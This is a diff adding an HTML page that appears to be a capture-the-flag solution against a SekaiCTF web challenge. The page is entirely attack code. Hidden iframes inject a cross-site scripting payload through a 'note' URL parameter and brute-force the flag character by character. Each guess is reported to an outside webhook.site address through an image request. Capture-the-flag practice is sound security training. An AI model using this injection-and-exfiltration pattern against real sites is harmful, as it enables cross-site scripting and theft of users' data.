@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>攻击页面</title></head>
+<body>
+<script>
+  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?';
+  // 从索引 6 开始（前缀 SEKAI{ 已占 6 位），最多假设 20 位
+  for (let i = 0; i < 30; i++) {
+      for (const c of chars) {
+          const code = c.charCodeAt(0);
+          const payload = `<script>
+              const parts = document.location.hostname.split('-');
+              const idx = parts[1];
+              const code = parseInt(parts[2]);
+              const flagChar = String.fromCharCode(code);
+              (new Image()).src = 'https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac?idx='+idx+'&char='+flagChar;
+          <\/script>`;
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = `https://nbv-${i}-${code}.chals.sekai.team/?note=${encodeURIComponent(payload)}`;
+          document.body.appendChild(iframe);
+      }
+  }
+</script>
+</body>
+</html>
